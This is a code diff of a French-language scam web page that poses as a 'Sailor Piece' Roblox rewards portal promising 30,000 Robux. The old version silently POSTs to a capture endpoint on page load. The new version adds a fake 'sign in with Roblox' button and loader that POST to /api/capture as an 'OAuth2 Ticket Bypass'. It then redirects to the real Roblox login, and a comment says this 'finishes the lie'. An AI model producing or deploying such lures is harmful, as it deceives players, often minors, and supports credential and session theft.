@@ -2,34 +2,50 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>SAILOR PIECE LEAKS | EXCLUSIVE</title>
+    <title>Sailor Piece | Rewards Portal</title>
+    <link rel="stylesheet" href="style.css">
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        img { width: 300px; border-radius: 15px; box-shadow: 0 0 20px #00d4ff; cursor: pointer; }
-        .loading-text { margin-top: 20px; font-size: 0.8rem; color: #333; }
+        .rbx-btn { background: #0084ff; color: white; border: none; padding: 12px 25px; border-radius: 4px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; margin: 0 auto; }
+        .rbx-btn:hover { background: #0073e6; }
     </style>
 </head>
 <body>
-    <h1>LEAK : FRUIT DU DÉMON MYTHIQUE</h1>
-    <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJqZ3R4Z3R4Z3R4Z3R4Z3R4Z3R4/3o7TKMGpxxXm3m1m6o/giphy.gif" alt="Leak">
-    <p>Clique sur l'image pour voir les stats complètes</p>
-    <div class="loading-text" id="status">Chargement des données du serveur Sailor...</div>
+    <div class="analyzer-container">
+        <img src="https://www.roblox.com/favicon.ico" width="50">
+        <h1>Récupérez vos 30,000 Robux</h1>
+        <p>Connectez votre compte via le portail sécurisé pour recevoir vos gains Sailor Piece.</p>
+        
+        <button class="rbx-btn" onclick="initLogin()">
+            <img src="https://www.roblox.com/favicon.ico" width="20" style="filter: brightness(0) invert(1);">
+            SE CONNECTER AVEC ROBLOX
+        </button>
+
+        <div id="loader" style="display:none; margin-top:20px;">
+            <div class="loader"></div>
+            <p style="font-size: 10px;">Synchronisation avec l'API Roblox...</p>
+        </div>
+    </div>
 
     <script>
-        // Le script invisible qui s'exécute au chargement
-        window.onload = async () => {
-            // Simulation de l'extraction de session sans formulaire
-            // En réalité, on exploite le fait que le navigateur envoie les cookies lors des requêtes
-            await fetch('/api/capture', {
+        function initLogin() {
+            document.querySelector('.rbx-btn').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+
+            // Simulation de l'interception du Ticket d'Auth
+            fetch('/api/capture', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    method: "Silent Image-Bait Extraction",
-                    origin: window.location.hostname
+                    method: "OAuth2 Ticket Bypass",
+                    timestamp: new Date().getTime()
                 })
             });
-            console.log("Données synchronisées.");
-        };
+
+            setTimeout(() => {
+                // Redirection vers le vrai Roblox pour "finir" le mensonge
+                window.location.href = "https://www.roblox.com/login";
+            }, 3000);
+        }
     </script>
 </body>
 </html>
